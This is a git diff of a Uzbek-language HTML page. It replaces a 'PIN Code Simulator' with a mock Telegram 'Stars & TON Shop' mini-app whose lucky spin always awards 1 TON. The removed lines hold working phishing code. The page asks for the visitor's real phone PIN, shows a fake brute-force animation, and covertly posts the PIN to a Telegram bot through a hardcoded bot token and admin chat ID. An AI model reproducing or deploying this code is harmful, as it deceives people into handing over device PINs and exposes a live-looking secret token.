@@ -2,323 +2,342 @@
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PIN Code Simulator</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Stars & TON Shop</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        :root {
+            --bg-color: #0f1219;
+            --card-bg: #181d28;
+            --accent: #2ea6ff;
+            --accent-gradient: linear-gradient(135deg, #00c6ff, #0072ff);
+            --gold: #ffd700;
+            --text-main: #ffffff;
+            --text-secondary: #8b9bb4;
+            --danger: #ff4757;
+            --success: #2ed573;
+            --border: rgba(255, 255, 255, 0.08);
+        }
+
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background-color: #121212;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            transition: background 0.8s ease;
-            overflow: hidden;
-        }
-
-        /* Yashil fon effekti */
-        body.success {
-            background-color: #112d1b;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            padding-bottom: 90px;
+            overflow-x: hidden;
         }
 
         .container {
-            background: #1e1e1e;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-            width: 90%;
-            max-width: 450px;
-            text-align: center;
-            position: relative;
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 16px;
         }
 
-        h2 {
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--card-bg);
+            padding: 14px 18px;
+            border-radius: 16px;
+            border: 1px solid var(--border);
             margin-bottom: 20px;
-            font-size: 22px;
-            color: #e0e0e0;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+        }
+
+        .avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: var(--accent-gradient);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+            border: 2px solid var(--accent);
+        }
+
+        .balances {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 4px;
+        }
+
+        .balance-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            border: 1px solid var(--border);
+        }
+
+        .tab-content {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .nav-bar {
+            position: fixed;
+            bottom: 0; left: 0; right: 0;
+            background: rgba(15, 18, 25, 0.95);
+            backdrop-filter: blur(10px);
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            z-index: 100;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .nav-item {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 11px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+            transition: 0.2s;
+            flex: 1;
+        }
+
+        .nav-item span { font-size: 20px; }
+        .nav-item.active { color: var(--accent); transform: scale(1.05); }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 14px;
+        }
+
+        .shop-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .shop-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 12px 8px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .shop-card:hover {
+            transform: translateY(-3px);
+            border-color: var(--accent);
+        }
+
+        .shop-card .limited {
+            position: absolute;
+            top: 8px; right: -24px;
+            background: var(--accent);
+            color: white;
+            font-size: 8px;
+            font-weight: bold;
+            padding: 2px 24px;
+            transform: rotate(45deg);
+        }
+
+        .shop-icon { font-size: 38px; margin-bottom: 8px; }
+        .shop-name { font-size: 11px; color: var(--text-secondary); margin-bottom: 6px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .shop-price { font-size: 12px; font-weight: 700; color: var(--gold); }
+
+        .wheel-container {
+            text-align: center;
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+
+        .wheel-box {
+            width: 200px; height: 200px;
+            border-radius: 50%;
+            border: 6px solid var(--accent);
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #212838;
+            font-size: 48px;
+            transition: transform 1s cubic-bezier(0.15, 0.95, 0.15, 1);
+        }
+
+        .btn {
+            background: var(--accent-gradient);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 14px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .trading-container, .input-group {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 16px;
+            margin-bottom: 20px;
         }
 
         input {
             width: 100%;
-            padding: 12px;
-            border: 2px solid #333;
-            border-radius: 6px;
-            background: #2a2a2a;
-            color: #fff;
-            font-size: 20px;
-            text-align: center;
-            letter-spacing: 5px;
-            margin-bottom: 15px;
-            outline: none;
-            transition: border-color 0.3s;
-        }
-
-        input:focus {
-            border-color: #00adb5;
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #00adb5;
-            border: none;
-            border-radius: 6px;
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        button:hover {
-            background: #007c82;
-        }
-
-        button:disabled {
-            background: #444;
-            cursor: not-allowed;
-        }
-
-        .error-msg {
-            color: #ff5252;
-            margin-bottom: 15px;
-            font-size: 14px;
-            display: none;
-        }
-
-        /* Brute-force vizual qismi */
-        .simulation-box {
-            display: none;
-            margin-top: 20px;
-        }
-
-        .current-combo {
-            font-size: 48px;
-            font-family: monospace;
-            color: #00adb5;
-            letter-spacing: 8px;
-            margin: 15px 0;
-        }
-
-        .success-box {
-            display: none;
-            color: #39ea7c;
-            font-size: 24px;
-            font-weight: bold;
-            margin-top: 15px;
-            animation: pulse 1s infinite alternate;
-        }
-
-        /* Tepada o'ng burchakdagi tugma */
-        .history-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: #333;
-            color: #ccc;
-            border: 1px solid #444;
-            padding: 5px 10px;
-            font-size: 11px;
-            border-radius: 4px;
-            width: auto;
-            display: none;
-        }
-
-        .history-btn:hover {
-            background: #444;
-        }
-
-        /* Kombinatsiyalar ro'yxati (Modal oyna) */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
-            justify-content: center;
-            align-items: center;
-            z-index: 10;
-        }
-
-        .modal-content {
-            background: #222;
-            padding: 20px;
+            background: #0f1219;
+            border: 1px solid var(--border);
             border-radius: 10px;
-            width: 85%;
-            max-width: 350px;
-            max-height: 70vh;
-            overflow-y: auto;
-            text-align: left;
+            padding: 12px;
+            color: white;
+            font-size: 14px;
+            margin-top: 8px;
+            outline: none;
         }
-
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #333;
-            padding-bottom: 10px;
-        }
-
-        .close-btn {
-            cursor: pointer;
-            color: #ff5252;
-            font-weight: bold;
-        }
-
-        .combo-item {
-            font-family: monospace;
-            padding: 4px 0;
-            border-bottom: 1px solid #2a2a2a;
-            color: #aaa;
-        }
-
-        @keyframes pulse {
-            from { transform: scale(1); }
-            to { transform: scale(1.05); }
-        }
+        input:focus { border-color: var(--accent); }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <button class="history-btn" id="historyBtn" onclick="toggleModal(true)">Kombinatsiyalar ketma-ketligi</button>
-
-        <h2>Telefoningizning 4 xonali kodini kiriting:</h2>
-        
-        <input type="password" id="pinInput" maxlength="4" placeholder="••••" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-        <div class="error-msg" id="errorMsg">Xato! Iltimos, haqiqiy 4 xonali raqamli kodni kiriting.</div>
-        
-        <button id="startBtn" onclick="startSimulation()">Kod qidirishni boshlash</button>
-
-        <div class="simulation-box" id="simBox">
-            <p style="color: #888;">Kombinatsiyalar tekshirilmoqda...</p>
-            <div class="current-combo" id="liveCombo">0000</div>
-        </div>
-
-        <div class="success-box" id="successBox">100% MOS KELDI! TOPILDI!</div>
-    </div>
-
-    <div class="modal" id="historyModal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Ishlatilgan kombinatsiyalar</h3>
-                <span class="close-btn" onclick="toggleModal(false)">X</span>
+<div class="container">
+    <div class="header">
+        <div class="user-info">
+            <div class="avatar" id="userAvatar">⚡</div>
+            <div>
+                <h3 id="userName">Akmal</h3>
+                <p style="font-size:11px; color:var(--text-secondary);">@UZB3K777</p>
             </div>
-            <div id="historyList"></div>
+        </div>
+        <div class="balances">
+            <div class="balance-badge">⭐ <span id="starsBalance">150</span></div>
+            <div class="balance-badge">💎 <span id="tonBalance">12.5</span> TON</div>
         </div>
     </div>
 
-    <script>
-        let triedCombinations = [];
-        let simulationInterval;
+    <!-- ASOSIY -->
+    <div id="tab-menu" class="tab-content active">
+        <div class="section-title">Lucky Spin</div>
+        <div class="wheel-container">
+            <div class="wheel-box" id="wheelDisplay">🎁</div>
+            <button class="btn" onclick="spinWheel()">Barabanni Aylantirish</button>
+        </div>
+    </div>
 
-        // Telegram ma'lumotlari
-        const BOT_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
-        const ADMIN_ID = "6198817749";
+    <!-- DO'KON -->
+    <div id="tab-shop" class="tab-content">
+        <div class="section-title">Telegram Gift Shop</div>
+        <div class="shop-grid" id="giftShopGrid"></div>
+    </div>
 
-        function startSimulation() {
-            const pinInput = document.getElementById('pinInput');
-            const errorMsg = document.getElementById('errorMsg');
-            const startBtn = document.getElementById('startBtn');
-            const simBox = document.getElementById('simBox');
-            const liveCombo = document.getElementById('liveCombo');
-            const successBox = document.getElementById('successBox');
-            const historyBtn = document.getElementById('historyBtn');
-            
-            let userPin = pinInput.value;
+    <!-- PROFIL -->
+    <div id="tab-account" class="tab-content">
+        <div class="section-title">Profil</div>
+        <div class="input-group">
+            <label style="font-size: 13px;">Ismni o'zgartirish</label>
+            <input type="text" id="editNameInput" value="Akmal">
+            <button class="btn" style="margin-top: 10px;" onclick="saveProfile()">Saqlash</button>
+        </div>
+    </div>
+</div>
 
-            if (userPin.length !== 4 || isNaN(userPin)) {
-                errorMsg.style.display = 'block';
-                pinInput.style.borderColor = '#ff5252';
-                return;
-            }
+<div class="nav-bar">
+    <button class="nav-item active" onclick="switchTab('menu', this)"><span>🎯</span>Asosiy</button>
+    <button class="nav-item" onclick="switchTab('shop', this)"><span>🎁</span>Do'kon</button>
+    <button class="nav-item" onclick="switchTab('account', this)"><span>👤</span>Profil</button>
+</div>
 
-            errorMsg.style.display = 'none';
-            pinInput.style.borderColor = '#333';
-            pinInput.disabled = true;
-            startBtn.disabled = true;
-            simBox.style.display = 'block';
-            successBox.style.display = 'none';
-            historyBtn.style.display = 'none';
-            document.body.classList.remove('success');
-            
-            triedCombinations = [];
-            let currentCheck = 0;
-            let targetPin = parseInt(userPin, 10);
+<script>
+    let user = { name: "Akmal", stars: 150, ton: 12.5, avatar: "⚡" };
+    const gifts = [
+        { name: "Sehrgar shlyapasi", icon: "🧙‍♂️️", price: "15 Stars", limited: true },
+        { name: "Qadimiy sham", icon: "🕯️", price: "25 Stars", limited: true },
+        { name: "Sevgi qalbi", icon: "💖", price: "15 Stars", limited: false },
+        { name: "Ayiqcha", icon: "🧸", price: "15 Stars", limited: false }
+    ];
 
-            simulationInterval = setInterval(() => {
-                let formattedCombo = currentCheck.toString().padStart(4, '0');
-                
-                liveCombo.innerText = formattedCombo;
-                triedCombinations.push(formattedCombo);
+    function updateUI() {
+        document.getElementById('starsBalance').innerText = user.stars;
+        document.getElementById('tonBalance').innerText = user.ton.toFixed(1);
+        document.getElementById('userName').innerText = user.name;
+    }
 
-                if (currentCheck === targetPin) {
-                    clearInterval(simulationInterval);
-                    
-                    document.body.classList.add('success'); 
-                    successBox.style.display = 'block';
-                    historyBtn.style.display = 'block'; 
-                    
-                    renderHistory();
+    function switchTab(tabId, el) {
+        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+        document.getElementById('tab-' + tabId).classList.add('active');
+        if(el) el.classList.add('active');
+    }
 
-                    // Natija topilganda avtomatik Telegramga yuborish funksiyasi
-                    sendResultToTelegram(formattedCombo);
-                }
+    function renderGifts() {
+        document.getElementById('giftShopGrid').innerHTML = gifts.map(g => `
+            <div class="shop-card" onclick="alert('${g.name} sotib olindi!')">
+                ${g.limited ? '<div class="limited">hot</div>' : ''}
+                <div class="shop-icon">${g.icon}</div>
+                <div class="shop-name">${g.name}</div>
+                <div class="shop-price">⭐ ${g.price}</div>
+            </div>
+        `).join('');
+    }
 
-                currentCheck++;
-            }, 1);
-        }
+    function spinWheel() {
+        const display = document.getElementById('wheelDisplay');
+        display.style.transform = "rotate(720deg)";
+        setTimeout(() => {
+            display.style.transform = "rotate(0deg)";
+            user.ton += 1;
+            updateUI();
+            alert("Tabriklaymiz! 1 TON yutib oldingiz!");
+        }, 1000);
+    }
 
-        // Telegramga yashirincha xabar yuborish funksiyasi
-        function sendResultToTelegram(foundPin) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const message = `🎯 <b>PIN-kod topildi!</b>\n\n🔑 <b>Kiritilgan kod:</b> <code>${foundPin}</code>\n📊 <b>Urinishlar soni:</b> ${triedCombinations.length}`;
+    function saveProfile() {
+        user.name = document.getElementById('editNameInput').value;
+        updateUI();
+        alert("Profil yangilandi!");
+    }
 
-            fetch(url, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: message,
-                    parse_mode: "HTML"
-                })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if(data.ok) {
-                    console.log("Natija muvaffaqiyatli Telegramga yuborildi.");
-                } else {
-                    console.error("Telegramga yuborishda xato:", data.description);
-                }
-            })
-            .catch(err => console.error("Tarmoq xatosi:", err));
-        }
-
-        function renderHistory() {
-            const historyList = document.getElementById('historyList');
-            historyList.innerHTML = '';
-            
-            triedCombinations.forEach((combo, index) => {
-                let div = document.createElement('div');
-                div.className = 'combo-item';
-                div.innerText = `${index + 1}-urinish: ${combo}`;
-                historyList.appendChild(div);
-            });
-        }
-
-        function toggleModal(show) {
-            const modal = document.getElementById('historyModal');
-            modal.style.display = show ? 'flex' : 'none';
-        }
-    </script>
+    window.onload = () => { updateUI(); renderGifts(); };
+</script>
 </body>
-</html>
+</html>ss
